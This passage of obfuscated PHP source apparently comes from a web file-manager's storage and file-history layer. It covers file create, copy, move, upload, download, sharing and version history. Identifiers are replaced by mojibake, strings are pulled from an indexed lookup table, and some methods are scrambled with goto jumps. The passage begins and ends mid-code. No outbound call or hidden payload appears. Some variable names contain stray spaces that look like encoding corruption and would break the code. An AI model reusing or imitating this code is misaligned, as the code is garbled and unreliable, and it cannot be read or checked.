$a«„ŠÏ£¼ê, $DéÆŞ¨ö, $e¯Ó¶çÛÖ) { $a¿Ñ§ñ•–Ä = $this->model->copyFolderFromIO($e´£Å¨²‰×, $B™Ó“¸»Ù, $a«„ŠÏ£¼ê, $DéÆŞ¨ö, $e¯Ó¶çÛÖ); return KodIO::make($a¿Ñ§ñ•–Ä); } public function isParentOf($bä†ƒ‹©¦, $CÆæùãÖ™²) { return $this->model->isParentOf($bä†ƒ‹©¦, $CÆæùãÖ™²); } public function mkfile($dèèÍÓ·×ñ, $c¤ÍÎ¯¡Ä– = '', $c¦”Ù›Š°± = REPEAT_RENAME) { $F‡¢âøà =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a¢‰‰‡»Ó = $this->parse($dèèÍÓ·×ñ); $dèèÍÓ·×ñ = $a¢‰‰‡»Ó[$F‡¢âøà[395]]; for ($dĞ¡´ß = 0; $dĞ¡´ß < count($a¢‰‰‡»Ó[$F‡¢âøà[1228]]); $dĞ¡´ß++) { $cÕ •¬Áçİ = $a¢‰‰‡»Ó[$F‡¢âøà[1228]][$dĞ¡´ß]; if ($dĞ¡´ß == count($a¢‰‰‡»Ó[$F‡¢âøà[1228]]) - 1) { $dèèÍÓ·×ñ = $this->model->mkfile($dèèÍÓ·×ñ, $cÕ •¬Áçİ, $c¤ÍÎ¯¡Ä–, $c¦”Ù›Š°±); break; } $dèèÍÓ·×ñ = $this->model->mkdir($dèèÍÓ·×ñ, $cÕ •¬Áçİ, REPEAT_SKIP); } return $this->getPathOuter($dèèÍÓ·×ñ); } public function mkdir($fÒÖÎÍ³‡©, $B„äŠ…È£– = REPEAT_SKIP) { $eğÕÆé¥„Ê =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D‘¯ò§„ = $this->parse($fÒÖÎÍ³‡©); $fÒÖÎÍ³‡© = $D‘¯ò§„[$eğÕÆé¥„Ê[395]]; for ($Eæ´‡ Ê‚ = 0; $Eæ´‡ Ê‚ < count($D‘¯ò§„[$eğÕÆé¥„Ê[1228]]); $Eæ´‡ Ê‚++) { $fÛ–†ãÜªå = $D‘¯ò§„[$eğÕÆé¥„Ê[1228]][$Eæ´‡ Ê‚]; $fÒÖÎÍ³‡© = $this->model->mkdir($fÒÖÎÍ³‡©, $fÛ–†ãÜªå, $B„äŠ…È£–); } return $this->getPathOuter($fÒÖÎÍ³‡©); } public function copyFile($E—¯„®œ‹Ã, $Bˆ½Š¯²©•, $D§«àƒÓÊ” = REPEAT_REPLACE) { $BÉ«÷£ Ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $eØ±´˜÷²Å = $this->parse($Bˆ½Š¯²©•); $DîŸŠù¸­¸ = $this->model->copy($E—¯„®œ‹Ã, $eØ±´˜÷²Å[$BÉ«÷£ Ç[395]], $D§«àƒÓÊ”, $eØ±´˜÷²Å[$BÉ«÷£ Ç[76]]); return $DîŸŠù¸­¸ ? $this->getPathOuter($DîŸŠù¸­¸) : !1; } public function moveFile($C´ß ¦£Ä, $dì¥Í¨Ù ‡, $d™ŞÉçÇÜİ = REPEAT_REPLACE) { $f… ‹‘‡›ƒ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fê–ˆ¤Šæ = $this->parse($dì¥Í¨Ù ‡); $EèÈƒÎÀó‰ = $this->model->move($C´ß ¦£Ä, $fê–ˆ¤Šæ[$f… ‹‘‡›ƒ[395]], $d™ŞÉçÇÜİ, $fê–ˆ¤Šæ[$f… ‹‘‡›ƒ[76]]); return $EèÈƒÎÀó‰ ? $this->getPathOuter($EèÈƒÎÀó‰) : !1; } public function copy($bÖ£ÄÏÒƒÃ, $c‚“À¾‘ù•, $CÒ±‡åŠì« = REPEAT_REPLACE) { $Eàô¨ÍİóÖ = $this->parse($c‚“À¾‘ù•); $EœğÈßÓè = $this->model->copy($bÖ£ÄÏÒƒÃ, $Eàô¨ÍİóÖ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][395]], $CÒ±‡åŠì«); return $EœğÈßÓè ? $this->getPathOuter($EœğÈßÓè) : !1; } public function moveSameAllow() { } public function move($Eçœì‘ğ, $bãå†çâî, $a¼¤Í¨ = REPEAT_REPLACE) { $bÑŠù³ŒËÎ = $this->parse($bãå†çâî); $CäÌ£‰Ú¥è = $this->model->move($Eçœì‘ğ, $bÑŠù³ŒËÎ[$_SERVER[Ôğ—¤Šµˆ˜ñ£][395]], $a¼¤Í¨); return $CäÌ£‰Ú¥è ? $this->getPathOuter($CäÌ£‰Ú¥è) : !1; } public function remove($E¤‰ØÍ†Õ¼, $c›Â³ĞÖÕ‚ = true) { return $this->model->remove($E¤‰ØÍ†Õ¼, $c›Â³ĞÖÕ‚); } public function rename($a«ßªÖ÷Š, $e—ëƒ©ŞÏé) { $dóâ´–³¤’ = $this->model->rename($a«ßªÖ÷Š, $e—ëƒ©ŞÏé); return $dóâ´–³¤’ ? $this->getPathOuter($a«ßªÖ÷Š) : $dóâ´–³¤’; } public function size($eó»•”¬®°) { $Cˆ­ÁÌĞ·› = $this->infoSimple($eó»•”¬®°); return $Cˆ­ÁÌĞ·› ? $Cˆ­ÁÌĞ·›[$_SERVER[Ôğ—¤Šµˆ˜ñ£][78]] : 0; } public function infoSimple($dÚŒïÃ‡ÛÕ) { return $this->model->sourceInfo($dÚŒïÃ‡ÛÕ); } public function info($FƒØË‹’‚) { return $this->infoParse($FƒØË‹’‚); } public function infoAuth($CÏÂ¤¼‡Õ®) { return $this->infoParse($CÏÂ¤¼‡Õ®, !1, !0); } public function infoWithChildren($FÙôëÍ„œß) { return $this->infoParse($FÙôëÍ„œß, !0); } protected function infoParse($F¯Œç¡¾¹î, $d‚ĞØä›Ô­ = false, $FÈé‰ÂµÂˆ = false) { if (!$d‚ĞØä›Ô­) { return $this->model->pathInfo($F¯Œç¡¾¹î, $FÈé‰ÂµÂˆ); } return $this->model->pathInfoMore($F¯Œç¡¾¹î); } public function infoFull($cŸ¢ì•ãœ) { $FÂÑœÅĞêŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Dæ°Œõ ë¼ = explode($FÂÑœÅĞêŠ[8], $cŸ¢ì•ãœ); $eñ…áöåõ = implode($FÂÑœÅĞêŠ[8], array_splice($Dæ°Œõ ë¼, 1)); return $this->model->pathInfoByPath($Dæ°Œõ ë¼[0], $eñ…áöåõ); } public function hashSimple($EÄ›Íº†¸„) { $eµ“õ“ÚˆØ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b‡˜éæÔ¦‚ = $this->infoWithChildren($EÄ›Íº†¸„); return $b‡˜éæÔ¦‚[$eµ“õ“ÚˆØ[164]][$eµ“õ“ÚˆØ[171]]; } public function hashMd5($cÏ§ğñù°­) { $fÆ´‚–â½© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $F¬ï‘åóƒÀ = $this->infoWithChildren($cÏ§ğñù°­); return $F¬ï‘åóƒÀ[$fÆ´‚–â½©[164]][$fÆ´‚–â½©[170]]; } public function exist($AöŞÄ‚ß„±) { $aæ²¯ç°› =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b§Ì²ƒ˜æ = $this->parse($AöŞÄ‚ß„±); if (!$b§Ì²ƒ˜æ[$aæ²¯ç°›[76]]) { return $this->isFile($AöŞÄ‚ß„±) || $this->isFolder($AöŞÄ‚ß„±); } $A…»”ŞáÙ = array($aæ²¯ç°›[396] => $b§Ì²ƒ˜æ[$aæ²¯ç°›[395]], $aæ²¯ç°›[28] => $b§Ì²ƒ˜æ[$aæ²¯ç°›[76]]); $FˆŒŞôâƒ = $this->model->where($A…»”ŞáÙ)->find(); return $FˆŒŞôâƒ ? !0 : !1; } public function isFile($BˆÍó ñ²é) { $Dƒ„Ó…íÔ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bˆÙ‹™»ÈÈ = $this->infoSimple($BˆÍó ñ²é); return $bˆÙ‹™»ÈÈ && $bˆÙ‹™»ÈÈ[$Dƒ„Ó…íÔ[405]] == $Dƒ„Ó…íÔ[87] ? !1 : !0; } public function isFolder($C…Ì¦Œ•“) { $EÙ°à¥Ö­† =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cƒËíøƒÅË = $this->infoSimple($C…Ì¦Œ•“); return $cƒËíøƒÅË && $cƒËíøƒÅË[$EÙ°à¥Ö­†[405]] == $EÙ°à¥Ö­†[87] ? !0 : !1; } public function listPath($eĞÑó£´ , $BŸóëóà›Â = false) { $A®Áµ¹¹Ãõ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($eĞÑó£´  == $A®Áµ¹¹Ãõ[33]) { return !1; } $a¥­³öŠğ = array($A®Áµ¹¹Ãõ[396] => $eĞÑó£´ ); if ($BŸóëóà›Â) { return $this->model->listSource($a¥­³öŠğ, -1); } return $this->model->listSource($a¥­³öŠğ); } public function has($e…ÌªêØŸİ, $B¾Áğˆ‹Ù™ = false, $b®ªôÛÃÊ = null) { $f¸¹àÚÖİ™ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $bŒ¡…õ»ŠÒ = $this->infoWithChildren($e…ÌªêØŸİ); if ($B¾Áğˆ‹Ù™) { return array($f¸¹àÚÖİ™[204] => $bŒ¡…õ»ŠÒ[$f¸¹àÚÖİ™[204]], $f¸¹àÚÖİ™[203] => $bŒ¡…õ»ŠÒ[$f¸¹àÚÖİ™[203]]); } return $b®ªôÛÃÊ ? $bŒ¡…õ»ŠÒ[$f¸¹àÚÖİ™[204]] : $bŒ¡…õ»ŠÒ[$f¸¹àÚÖİ™[203]]; } public function listAll($e³îˆ™¨½Ë) { $Eù•ù±î¤ = IO::info($this->pathParse[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]]); if (!$Eù•ù±î¤) { return array(); } return $this->model->listAll($e³îˆ™¨½Ë); } public function getContent($dÜª«èÕŒƒ) { return $this->model->getContent($dÜª«èÕŒƒ); } public function setContent($Dòªèªóí, $EÇ† ·¡…’ = '') { return $this->model->setContent($Dòªèªóí, $EÇ† ·¡…’); } public function fileSubstr($A”´±´É, $Cì£›Å®æ, $F¬ĞÏ–×åõ) { return $this->model->fileSubstr($A”´±´É, $Cì£›Å®æ, $F¬ĞÏ–×åõ); } public function download($aÁñÒÁ’ƒ, $Eè‹ô²µ÷¹ = '') { $FÍï•Åµº¼ = get_path_father($Eè‹ô²µ÷¹); $AÆà‚Ç¬¿ß = get_path_this($Eè‹ô²µ÷¹); $AÃ¡è™ ´Ø = $this->model->fileInfoGet($aÁñÒÁ’ƒ); $fÅøªÁ£Úï = IO::copy($AÃ¡è™ ´Ø[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]], $FÍï•Åµº¼, !1, $AÆà‚Ç¬¿ß); return $fÅøªÁ£Úï; } public function setModifyTime($fŒÍÔ†ƒ–, $f”Æõğ» = '') { $e–Ó›İòæ‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$fŒÍÔ†ƒ–) { return; } $this->model->where(array($e–Ó›İòæ‚[412] => $fŒÍÔ†ƒ–))->save(array($e–Ó›İòæ‚[84] => $f”Æõğ»)); } public function upload($F¬šª»Üîó, $B±¤‚èíÖ—, $D²ƒóš»—… = false, $F›ÍÖšè‘“ = REPEAT_REPLACE) { $AÆÏ‡ä…˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÔÀŸÕ¿ = $this->parse($F¬šª»Üîó); $E…Ğ¹¼ëÒ´ = $this->model->addFile($FÔÀŸÕ¿[$AÆÏ‡ä…˜[395]], $B±¤‚èíÖ—, $FÔÀŸÕ¿[$AÆÏ‡ä…˜[76]], $D²ƒóš»—…, $F›ÍÖšè‘“); return $this->getPathOuter($E…Ğ¹¼ëÒ´); } public function uploadFileByID($F™ŸéÕé¹, $BÃÃœ„ßš’, $c¤ÂÂ»ÂÏ) { $F¯ĞËÂÈ¤¼ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Fª‹ô‡ê¿ë = $this->parse($F™ŸéÕé¹); $FÅ‹¸¢Õ² = $this->model->addFileByFileID($Fª‹ô‡ê¿ë[$F¯ĞËÂÈ¤¼[395]], $BÃÃœ„ßš’, $Fª‹ô‡ê¿ë[$F¯ĞËÂÈ¤¼[76]], $c¤ÂÂ»ÂÏ); return $this->getPathOuter($FÅ‹¸¢Õ²); } public function addFileByRemote($Eå¬Ö•¹Öˆ, $a¡ã•ŠÂ‚, $eœ‘¼—‹çÙ = array(), $dø¤æ¤®ˆ” = '', $Bš˜‹·Â¬‹) { $Eš¶•­‹š˜ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $D¸ÉÍù‚ŒÀ = $this->parse($Eå¬Ö•¹Öˆ); $dø¤æ¤®ˆ” = empty($dø¤æ¤®ˆ”) ? $D¸ÉÍù‚ŒÀ[$Eš¶•­‹š˜[76]] : $dø¤æ¤®ˆ”; $BÕŠî¯ĞÄ = $this->model->addFileByRemote($D¸ÉÍù‚ŒÀ[$Eš¶•­‹š˜[395]], $a¡ã•ŠÂ‚, $dø¤æ¤®ˆ”, $eœ‘¼—‹çÙ, $Bš˜‹·Â¬‹); return $this->getPathOuter($BÕŠî¯ĞÄ); } public function uploadLink($aÅ¸°¤ô­, $b¶Ë÷³ì¿¯ = 0) { $b˜ÕÍßÈµ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÄÙ§½œ´­ = $this->parse($aÅ¸°¤ô­); $f·ˆ”“ÒÅÜ = _get($GLOBALS[$b˜ÕÍßÈµ[7]], $b˜ÕÍßÈµ[1229]); $f–ª­µ¼Î = _get($GLOBALS[$b˜ÕÍßÈµ[7]], $b˜ÕÍßÈµ[1230]); $aÅ¸°¤ô­ = Model($b˜ÕÍßÈµ[597])->createFileName($aÄÙ§½œ´­[$b˜ÕÍßÈµ[76]], $f·ˆ”“ÒÅÜ, $f–ª­µ¼Î); return IO::uploadLink($aÅ¸°¤ô­, $b¶Ë÷³ì¿¯); } public function fileNameAuto($fàÃŞ—Ö‘, $EÜÃˆ·ñÎ, $dÍŒÛ«Ø˜ = REPEAT_REPLACE, $Cº‚Ò’ò³ = false) { return $this->model->fileNameAuto($fàÃŞ—Ö‘, $EÜÃˆ·ñÎ, $dÍŒÛ«Ø˜, $Cº‚Ò’ò³); } public function fileNameExist($A˜®ßÄÄ, $a÷Ñ™µØãŒ) { return $this->model->fileNameExist($A˜®ßÄÄ, $a÷Ñ™µØãŒ); } protected function _fileOut($dÆéš²ÓÂÓ, $dÒ”ë–Òˆƒ = false, $Aõ ×‡†Í­ = false, $d¸—¹É­’ = '', $d•È¼êéÑŒ = false) { goto AùÕ¨Úã®¨; D‡áÑÖÔŞ²: $c‹À¢Ü’É¤ = $this->model->fileInfoGet($dÆéš²ÓÂÓ); $d¸—¹É­’ = $c‹À¢Ü’É¤[$DíÏíÛù™à[170]] ? $c‹À¢Ü’É¤[$DíÏíÛù™à[170]] : $d¸—¹É­’; $FÈ¯Ä²ê¼· = isset($GLOBALS[$DíÏíÛù™à[1232]]) ? $GLOBALS[$DíÏíÛù™à[1232]] : $b™¬›¾ÒÄÍ[$DíÏíÛù™à[28]]; goto F™µ¤Ú; AùÕ¨Úã®¨: $DíÏíÛù™à =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b™¬›¾ÒÄÍ = $this->model->sourceInfo($dÆéš²ÓÂÓ); if ($b™¬›¾ÒÄÍ[$DíÏíÛù™à[405]] == $DíÏíÛù™à[87]) { header($DíÏíÛù™à[1231]); die; } goto D‡áÑÖÔŞ²; F™µ¤Ú: if ($d•È¼êéÑŒ) { return IO::fileOutServer($c‹À¢Ü’É¤[$DíÏíÛù™à[76]], $dÒ”ë–Òˆƒ, $FÈ¯Ä²ê¼·, $d¸—¹É­’); } IO::fileOut($c‹À¢Ü’É¤[$DíÏíÛù™à[76]], $dÒ”ë–Òˆƒ, $FÈ¯Ä²ê¼·, $d¸—¹É­’); goto B•Û‚šÉéæ; B•Û‚šÉéæ: } public function fileOut($eéÉªËÉ™, $Dèºèá§æ× = false, $BÖô¡¾ÄÀª = false, $dŸÓëíªğ‘ = '') { $this->_fileOut($eéÉªËÉ™, $Dèºèá§æ×, $BÖô¡¾ÄÀª, $dŸÓëíªğ‘); } public function fileOutServer($dä¯Ì—Àº™, $añò‘Ë…ƒß = false, $FÃ†Â„ñ…¯ = false, $bÄŒŠ¹ÚÑù = '') { $this->_fileOut($dä¯Ì—Àº™, $añò‘Ë…ƒß, $FÃ†Â„ñ…¯, $bÄŒŠ¹ÚÑù, !0); } protected function _fileOutImage($fòê–…‘•, $e›ÇµÑ‚‡” = 250) { goto DËö’•¯ö’; BÊõîµÔ²ö: $GLOBALS[$AÍ™ä·³£[1232]] = $F†âÀ£õ†ß[$AÍ™ä·³£[28]]; $GLOBALS[$AÍ™ä·³£[162]] = $F†âÀ£õ†ß; IO::fileOutImage($F†âÀ£õ†ß[$AÍ™ä·³£[76]], $e›ÇµÑ‚‡”); goto A‡šİš©; B‘›¼Ğ³â: $F†âÀ£õ†ß = $this->model->fileInfoGet($fòê–…‘•); $F†âÀ£õ†ß[$AÍ™ä·³£[28]] = $aÄø“‹œöà[$AÍ™ä·³£[28]]; $F†âÀ£õ†ß[$AÍ™ä·³£[163]] = $aÄø“‹œöà[$AÍ™ä·³£[163]]; goto BÊõîµÔ²ö; DËö’•¯ö’: $AÍ™ä·³£ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÄø“‹œöà = $this->model->pathInfo($fòê–…‘•); if ($aÄø“‹œöà[$AÍ™ä·³£[405]] == $AÍ™ä·³£[87]) { show_json($AÍ™ä·³£[1233] . $fòê–…‘•, !1); } goto B‘›¼Ğ³â; A‡šİš©: } public function fileOutImage($fé¦Ê—”ƒŒ, $e½——š·µ = 250) { $this->_fileOutImage($fé¦Ê—”ƒŒ, $e½——š·µ); } public function fileOutImageServer($c÷ß»”Á½¾, $a—Ïä„®÷· = 250) { $this->_fileOutImage($c÷ß»”Á½¾, $a—Ïä„®÷·); } public function link($B„¼‹õã¬ò, $Fê‰”›ôÍĞ = '') { $bšÙĞàé© = $this->model->fileInfoGet($B„¼‹õã¬ò); return IO::link($bšÙĞàé©[$_SERVER[Ôğ—¤Šµˆ˜ñ£][76]], $Fê‰”›ôÍĞ); } protected function parse($Eá±Ášºóé) { $BùÚ…ÒËˆ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (strstr($Eá±Ášºóé, $BùÚ…ÒËˆ[8]) === !1) { return array($BùÚ…ÒËˆ[414] => intval($Eá±Ášºóé), $BùÚ…ÒËˆ[76] => $BùÚ…ÒËˆ[33], $BùÚ…ÒËˆ[1228] => array()); } $døùùÂ‚ = explode($BùÚ…ÒËˆ[8], trim($Eá±Ášºóé, $BùÚ…ÒËˆ[8])); if (count($døùùÂ‚) < 2) { show_tips($Eá±Ášºóé . $BùÚ…ÒËˆ[1234]); } return array($BùÚ…ÒËˆ[414] => intval($døùùÂ‚[0]), $BùÚ…ÒËˆ[76] => $døùùÂ‚[1], $BùÚ…ÒËˆ[1228] => array_slice($døùùÂ‚, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($F°ƒÎŞ) { $this->pathParse = $F°ƒÎŞ; $this->model = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][1227]); } public function getPathOuter($CÛñ‰Ø”Œ) { $CÃƒ¹‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$CÛñ‰Ø”Œ) { return $CÛñ‰Ø”Œ; } $A¥ğÆ†ŒÌ‰ = $this->parse($CÛñ‰Ø”Œ); return trim(KodIO::makeShare($this->pathParse[$CÃƒ¹‰[395]], $A¥ğÆ†ŒÌ‰[$CÃƒ¹‰[395]]), $CÃƒ¹‰[8]); } protected function infoParse($eãŸŸ—ù‡ô, $Cö†ÌÔ± = false, $F—ëóí¬È— = false) { $DöŒÍÅ„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Bê‡ô±œ…ò = $this->pathParse[$DöŒÍÅ„[395]]; $fŞçÉÎ÷Ó„ = trim($this->pathParse[$DöŒÍÅ„[1085]], $DöŒÍÅ„[8]); return Action($DöŒÍÅ„[1235])->sharePathInfo($Bê‡ô±œ…ò, $fŞçÉÎ÷Ó„); } public function infoFull($CØê†¬ÂÄ·) { $bÈÚƒ¦¤º¿ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dé‘„òÌ» = explode($bÈÚƒ¦¤º¿[8], trim($CØê†¬ÂÄ·, $bÈÚƒ¦¤º¿[8])); if (count($dé‘„òÌ») > 1) { $FêËïö–ò = implode($bÈÚƒ¦¤º¿[8], array_splice($dé‘„òÌ», 1)); $fƒ„ÅñÔº = $this->model->pathInfoByPath($dé‘„òÌ»[0], $FêËïö–ò); if (!$fƒ„ÅñÔº) { return !1; } $this->pathParse[$bÈÚƒ¦¤º¿[1085]] = $fƒ„ÅñÔº[$bÈÚƒ¦¤º¿[397]]; } return $this->infoParse($CØê†¬ÂÄ·); } public function listAll($fª¹¾öØ˜ğ) { goto CœéÉÈ‘àß; FĞƒ¬‰È‹º: $f•‹êŒÖĞ = $this->model->listAll($fª¹¾öØ˜ğ); $EŠÎƒ•ğğÃ = Model($dïÈÔ¬ªô[589])->getInfo($A®ä…ƒÑÌ’[$dïÈÔ¬ªô[482]]); $FÌÇ˜Ñ·ù = Action($dïÈÔ¬ªô[1235]); goto DùˆÈ±Ô¼‘; CœéÉÈ‘àß: $dïÈÔ¬ªô =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A®ä…ƒÑÌ’ = IO::info($this->pathParse[$dïÈÔ¬ªô[76]]); if (!$A®ä…ƒÑÌ’) { return array(); } goto FĞƒ¬‰È‹º; DùˆÈ±Ô¼‘: foreach ($f•‹êŒÖĞ as &$dŞÑ¾Ìã°) { check_abort(); $dŞÑ¾Ìã°[$dïÈÔ¬ªô[85]] = $FÌÇ˜Ñ·ù->_shareItemeParse($dŞÑ¾Ìã°[$dïÈÔ¬ªô[85]], $EŠÎƒ•ğğÃ); } unset($dŞÑ¾Ìã°); return $f•‹êŒÖĞ; goto B¥ŠØ„²Ä; B¥ŠØ„²Ä: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($BœÅË—êÚá) { $this->pathParse = $BœÅË—êÚá; $this->model = Model($_SERVER[Ôğ—¤Šµˆ˜ñ£][1227]); } protected function infoParse($CôíÖ®˜·, $a¾Å¥Òšê¥ = false, $a×µ¥‚‹¡Á = false) { $BÓĞàºÙ†„ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; return Action($BÓĞàºÙ†„[1091])->sharePathInfo($this->pathParse[$BÓĞàºÙ†„[76]], !0); } public function listPath($B¸‡ßÙøÎ, $C¶„îãÕÓ± = false) { $DöõËÈ¢¤­ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A½›ŠŒù¨ñ = parent::listPath($B¸‡ßÙøÎ, $C¶„îãÕÓ±); foreach ($A½›ŠŒù¨ñ as $FÔ…ŒÏ‰á× => $D¤ë¬÷¼­Ø) { if (!in_array($FÔ…ŒÏ‰á×, array($DöõËÈ¢¤­[74], $DöõËÈ¢¤­[75]))) { continue; } foreach ($D¤ë¬÷¼­Ø as $D‡—»¬Ú => $EÑÔÊ—×É‚) { $A½›ŠŒù¨ñ[$FÔ…ŒÏ‰á×][$D‡—»¬Ú] = Action($DöõËÈ¢¤­[1091])->shareItemInfo($EÑÔÊ—×É‚); } } return $A½›ŠŒù¨ñ; } public function listAll($F¸ğ—šËÛ) { goto b¥Š©Ã¶‘Ñ; BäÛ…·ùê§: return $eğ¡ íå°…; goto d³öìåÚ·¢; Aæ‡½ˆÖ¼: $eğ¡ íå°… = $this->model->listAll($F¸ğ—šËÛ); foreach ($eğ¡ íå°… as &$CÙ¸†áèÏ‘) { $CÙ¸†áèÏ‘[$Dš‰Ó®¨À[85]] = Action($Dš‰Ó®¨À[1091])->shareItemInfo($CÙ¸†áèÏ‘[$Dš‰Ó®¨À[85]]); } unset($CÙ¸†áèÏ‘); goto BäÛ…·ùê§; b¥Š©Ã¶‘Ñ: $Dš‰Ó®¨À =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $c»¹Ãğ•ƒ = IO::info($this->pathParse[$Dš‰Ó®¨À[76]]); if (!$c»¹Ãğ•ƒ) { return array(); } goto Aæ‡½ˆÖ¼; d³öìåÚ·¢: } } goto fÅ¡å¶íùØ; DÒ”òÖ—‚ò: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto Dò¶ãëéë³; Dò¶ãëéë³: $c”˜†ÆÕµÕ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $døÌŒ‰À° = $GLOBALS[$c”˜†ÆÕµÕ[6]][$c”˜†ÆÕµÕ[88]]; if ($døÌŒ‰À°[$c”˜†ÆÕµÕ[1124]] != 1) { return; } goto c¬–—ÍÍåï; a´Š„™±±ˆ: Hook::bind($c”˜†ÆÕµÕ[1129], $c”˜†ÆÕµÕ[1130]); Hook::bind($c”˜†ÆÕµÕ[1131], $c”˜†ÆÕµÕ[1132]); Hook::bind($c”˜†ÆÕµÕ[1133], $c”˜†ÆÕµÕ[1134]); goto fñ ¢®°—; fñ ¢®°—: Hook::bind($c”˜†ÆÕµÕ[1135], $c”˜†ÆÕµÕ[1136]); Hook::bind($c”˜†ÆÕµÕ[1137], $c”˜†ÆÕµÕ[1138]); goto e¡‡±Ï‚­–; c¬–—ÍÍåï: if ($døÌŒ‰À°[$c”˜†ÆÕµÕ[1125]] <= 0) { return; } if (isset($_REQUEST[$c”˜†ÆÕµÕ[1126]]) && $_REQUEST[$c”˜†ÆÕµÕ[1126]] == $c”˜†ÆÕµÕ[87]) { return; } Hook::bind($c”˜†ÆÕµÕ[1127], $c”˜†ÆÕµÕ[1128]); goto a´Š„™±±ˆ; e¡‡±Ï‚­–: } public static function eventBeforeUpload($D’Ê¿±„äŠ) { if ($D’Ê¿±„äŠ[3] && $D’Ê¿±„äŠ[3] != REPEAT_REPLACE) { return; } $e·ÃïÁæ°„ = self::parsePath($D’Ê¿±„äŠ[0]); if (!$e·ÃïÁæ°„) { return; } self::add($e·ÃïÁæ°„); } public static function eventBeforeEdit($Bæ˜ÌÚ›÷Ş) { $e»öğÄ÷“ï = self::parsePath($Bæ˜ÌÚ›÷Ş[0]); if (!$e»öğÄ÷“ï) { return; } self::add($e»öğÄ÷“ï); } public static function eventBeforeCopyFile($e•ù‰‘á‚, $eäÃí‚Â˜¹, $a„ŠõÁ‡ëô, $b°è‚Î’, $fË•ï“¨ğ©, $dæ³•†³) { $FòÀÒ²ŒÄÎ = $a„ŠõÁ‡ëô->getPathOuter($b°è‚Î’); $EÃÛÉËĞ˜Ç = self::parsePath($FòÀÒ²ŒÄÎ); if (!$EÃÛÉËĞ˜Ç) { return; } self::add($EÃÛÉËĞ˜Ç); } public static function eventBeforeRename($eº™ˆŞÄÙµ) { $AŸ°›êœº¢ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $a­ÜÈÄŞçÂ = self::parsePath($eº™ˆŞÄÙµ[0]); if (!$a­ÜÈÄŞçÂ) { return; } $FºÃœŒ = self::checkInHistory($a­ÜÈÄŞçÂ); if (!$FºÃœŒ) { return; } if ($FºÃœŒ[$AŸ°›êœº¢[29]] == $AŸ°›êœº¢[193]) { $aÕ¸®µ–›œ = self::listData($a­ÜÈÄŞçÂ); if ($aÕ¸®µ–›œ && $aÕ¸®µ–›œ[$AŸ°›êœº¢[367]]) { self::moveHistory($a­ÜÈÄŞçÂ, $eº™ˆŞÄÙµ[1]); } } else { IO::rename($FºÃœŒ[$AŸ°›êœº¢[76]], $eº™ˆŞÄÙµ[1]); } } public static function eventBeforeMove($D×§éÍõÒÛ) { goto F×¾…œ»º; aµ¢¯Æçƒ‰: if ($cí“è¤”©Ô[$B›Ø…˜­–â[29]] == $B›Ø…˜­–â[193]) { $fÅš…àãô‡ = self::listData($EÊ°ÔŒÃµ ); $c‡©¦Ä´© = rtrim($fÃÑÖ°®öÎ, $B›Ø…˜­–â[8]) . $B›Ø…˜­–â[8] . ($bˆ¤¢££òÊ ? $bˆ¤¢££òÊ : get_path_this($EÊ°ÔŒÃµ )); $b”íæ´åª† = self::listData($c‡©¦Ä´©); if ($fÅš…àãô‡ && $fÅš…àãô‡[$B›Ø…˜­–â[367]] && $b”íæ´åª† && $b”íæ´åª†[$B›Ø…˜­–â[367]]) { return self::clear($EÊ°ÔŒÃµ ); } if ($fÅš…àãô‡ && $fÅš…àãô‡[$B›Ø…˜­–â[367]]) { self::moveHistory($EÊ°ÔŒÃµ , $bˆ¤¢££òÊ, $B©Í§èóšÙ); } } else { IO::move($cí“è¤”©Ô[$B›Ø…˜­–â[76]], $B©Í§èóšÙ, !1, $bˆ¤¢££òÊ); self::clearEmptyFolder(IO::pathFather($cí“è¤”©Ô[$B›Ø…˜­–â[76]])); } goto A‰¿¯’ ±¥; Bé™î•Á¯ò: $cí“è¤”©Ô = self::checkInHistory($EÊ°ÔŒÃµ ); if (!$cí“è¤”©Ô) { return; } $B©Í§èóšÙ = self::pathHistory($fÃÑÖ°®öÎ); goto aµ¢¯Æçƒ‰; F×¾…œ»º: $B›Ø…˜­–â =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EÊ°ÔŒÃµ  = self::parsePath($D×§éÍõÒÛ[0]); if (!$EÊ°ÔŒÃµ ) { return; } goto bæô¼Ê‚Ö; bæô¼Ê‚Ö: $fÃÑÖ°®öÎ = self::parsePath($D×§éÍõÒÛ[1]); if (!$fÃÑÖ°®öÎ) { return; } $bˆ¤¢££òÊ = $D×§éÍõÒÛ[3]; goto Bé™î•Á¯ò; A‰¿¯’ 